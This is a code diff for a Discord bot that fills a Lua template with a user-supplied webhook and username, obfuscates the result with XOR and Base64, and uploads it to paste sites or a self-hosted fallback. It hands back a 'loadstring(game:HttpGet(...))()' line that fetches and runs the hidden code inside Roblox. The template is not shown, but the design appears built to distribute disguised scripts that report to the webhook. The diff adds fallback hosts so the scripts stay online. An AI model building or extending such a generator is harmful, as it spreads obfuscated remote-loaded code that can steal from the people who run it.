@@ -3,23 +3,52 @@ const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
 const express = require('express');
+const { v4: uuidv4 } = require('uuid');
 require('dotenv').config();
 
-// ----- Web server (health check only) -----
+// ----- Web server (for health check & self‑host fallback) -----
 const app = express();
 const PORT = process.env.PORT || 3000;
 app.get('/', (req, res) => res.send('Bot is alive!'));
+
+// Self‑host storage (fallback)
+const STORE_FILE = path.join(__dirname, 'scripts.json');
+let scripts = new Map();
+if (fs.existsSync(STORE_FILE)) {
+    try {
+        const data = JSON.parse(fs.readFileSync(STORE_FILE, 'utf8'));
+        const now = Date.now();
+        for (const [id, entry] of Object.entries(data)) {
+            if (now < entry.expires) scripts.set(id, entry);
+        }
+    } catch (e) {}
+}
+function saveScripts() {
+    const obj = Object.fromEntries(scripts);
+    fs.writeFileSync(STORE_FILE, JSON.stringify(obj, null, 2));
+}
+app.get('/script/:id', (req, res) => {
+    const id = req.params.id;
+    const entry = scripts.get(id);
+    if (!entry || Date.now() > entry.expires) {
+        scripts.delete(id);
+        saveScripts();
+        return res.status(404).send('Script not found or expired.');
+    }
+    res.set('Content-Type', 'text/plain');
+    res.send(entry.content);
+});
 app.listen(PORT, () => console.log(`✅ Web server running on port ${PORT}`));
 
-// ----- Self‑ping (keep Render awake) -----
-// We'll ping Render's own URL – if not set, we skip.
-const RENDER_URL = process.env.RENDER_EXTERNAL_URL || process.env.RENDER_URL;
-if (RENDER_URL) {
-    console.log(`🔁 Self‑ping enabled: ${RENDER_URL}`);
-    setInterval(() => axios.get(RENDER_URL).catch(() => {}), 4 * 60 * 1000);
-    setTimeout(() => axios.get(RENDER_URL).catch(() => {}), 5000);
+// ----- Public URL for self‑host fallback -----
+const BASE_URL = process.env.RENDER_EXTERNAL_URL || process.env.RENDER_URL;
+if (BASE_URL) {
+    console.log(`🌐 Public base URL: ${BASE_URL}`);
+    // Self‑ping
+    setInterval(() => axios.get(BASE_URL).catch(() => {}), 4 * 60 * 1000);
+    setTimeout(() => axios.get(BASE_URL).catch(() => {}), 5000);
 } else {
-    console.log('⚠️ Self‑ping disabled (RENDER_URL not set) – bot may sleep.');
+    console.log('⚠️ No RENDER_EXTERNAL_URL set – self‑host fallback disabled.');
 }
 
 // ----- Discord Bot -----
@@ -65,57 +94,46 @@ client.on('interactionCreate', async interaction => {
     }
 
     try {
-        // ----- Read template -----
+        // Read template
         const templatePath = path.join(__dirname, 'template.lua');
         if (!fs.existsSync(templatePath)) {
-            return interaction.editReply({ 
-                content: '❌ Template file `template.lua` not found in the bot directory.' 
-            });
+            return interaction.editReply({ content: '❌ Template file `template.lua` not found.' });
         }
         let template = fs.readFileSync(templatePath, 'utf8');
         template = template.replace(/\{\{WEBHOOK\}\}/g, webhook);
         template = template.replace(/\{\{USERNAME\}\}/g, username);
 
-        // ----- Obfuscate -----
+        // Obfuscate
         const obfuscated = obfuscateScript(template);
 
-        // ----- Upload to Rentry.co (no API key, never deletes) -----
-        let rawUrl;
-        try {
-            const response = await axios.post('https://rentry.co/api/new', {
-                text: obfuscated
-            });
-            if (response.data && response.data.url) {
-                const slug = response.data.url.split('/').pop();
-                rawUrl = `https://rentry.co/raw/${slug}`;
-                console.log(`✅ Uploaded to Rentry: ${rawUrl}`);
-            } else {
-                throw new Error('Rentry returned invalid response');
-            }
-        } catch (rentryError) {
-            console.error('Rentry upload failed:', rentryError.message);
-            // Fallback: we don't have a backup, so tell user
+        // Try to upload – returns { rawUrl, service }
+        const result = await uploadScript(obfuscated);
+        if (!result) {
             return interaction.editReply({ 
-                content: '❌ Failed to upload script to Rentry. Please try again later.' 
+                content: '❌ All paste services failed. Please set RENDER_EXTERNAL_URL in environment variables to enable self‑host fallback.' 
             });
         }
 
-        // ----- Build loadstring -----
+        const { rawUrl, service } = result;
         const loadstringLine = `loadstring(game:HttpGet("${rawUrl}"))()`;
 
-        // ----- Reply -----
         const embed = new EmbedBuilder()
             .setColor(0x00FF00)
             .setTitle('✅ Script Generated')
             .setDescription(`**Game:** ${game}\n**User:** ${username}`)
             .addFields(
-                { name: '📜 Loadstring (copy this)', value: `\`\`\`lua\n${loadstringLine}\n\`\`\``, inline: false },
-                { name: '📦 Hosted on', value: 'Rentry.co (no expiry, no deletion)', inline: false },
-                { name: '🔒 Obfuscation', value: 'XOR + Base64 (lightweight)', inline: false }
+                { name: '📜 Loadstring', value: `\`\`\`lua\n${loadstringLine}\n\`\`\``, inline: false },
+                { name: '📦 Hosted on', value: service, inline: false },
+                { name: '🔒 Obfuscation', value: 'XOR + Base64', inline: false }
             )
             .setTimestamp();
 
         await interaction.editReply({ embeds: [embed] });
+
+        // If self‑host was used, ping to keep alive
+        if (service === 'Self‑host (fallback)' && BASE_URL) {
+            axios.get(BASE_URL).catch(() => {});
+        }
 
     } catch (error) {
         console.error(error);
@@ -123,7 +141,71 @@ client.on('interactionCreate', async interaction => {
     }
 });
 
-// ----- Obfuscator (XOR + Base64) -----
+// ----- Upload function with fallbacks -----
+async function uploadScript(content) {
+    const services = [
+        { name: 'Rentry.co', upload: uploadRentry },
+        { name: 'MSK.PW', upload: uploadMSK },
+        { name: 'Hastebin', upload: uploadHastebin }
+    ];
+
+    for (const svc of services) {
+        try {
+            const rawUrl = await svc.upload(content);
+            if (rawUrl) {
+                console.log(`✅ Uploaded to ${svc.name}: ${rawUrl}`);
+                return { rawUrl, service: svc.name };
+            }
+        } catch (e) {
+            console.warn(`⚠️ ${svc.name} failed:`, e.message);
+        }
+    }
+
+    // Fallback: self‑host
+    if (BASE_URL) {
+        const id = uuidv4();
+        scripts.set(id, {
+            content: content,
+            expires: Date.now() + 24 * 60 * 60 * 1000
+        });
+        saveScripts();
+        const rawUrl = `${BASE_URL}/script/${id}`;
+        return { rawUrl, service: 'Self‑host (fallback)' };
+    }
+
+    return null; // all failed
+}
+
+// ----- Service uploaders -----
+async function uploadRentry(content) {
+    const res = await axios.post('https://rentry.co/api/new', { text: content }, { timeout: 10000 });
+    if (res.data && res.data.url) {
+        const slug = res.data.url.split('/').pop();
+        return `https://rentry.co/raw/${slug}`;
+    }
+    throw new Error('Invalid response');
+}
+
+async function uploadMSK(content) {
+    const res = await axios.post('https://msk.pw/api/paste', { text: content }, { timeout: 10000 });
+    if (res.data && res.data.id) {
+        return `https://msk.pw/raw/${res.data.id}`;
+    }
+    throw new Error('Invalid response');
+}
+
+async function uploadHastebin(content) {
+    const res = await axios.post('https://hastebin.com/documents', content, {
+        headers: { 'Content-Type': 'text/plain' },
+        timeout: 10000
+    });
+    if (res.data && res.data.key) {
+        return `https://hastebin.com/raw/${res.data.key}`;
+    }
+    throw new Error('Invalid response');
+}
+
+// ----- Obfuscator -----
 function obfuscateScript(raw) {
     const key = Math.floor(Math.random() * 254) + 1;
     let xorEncoded = '';
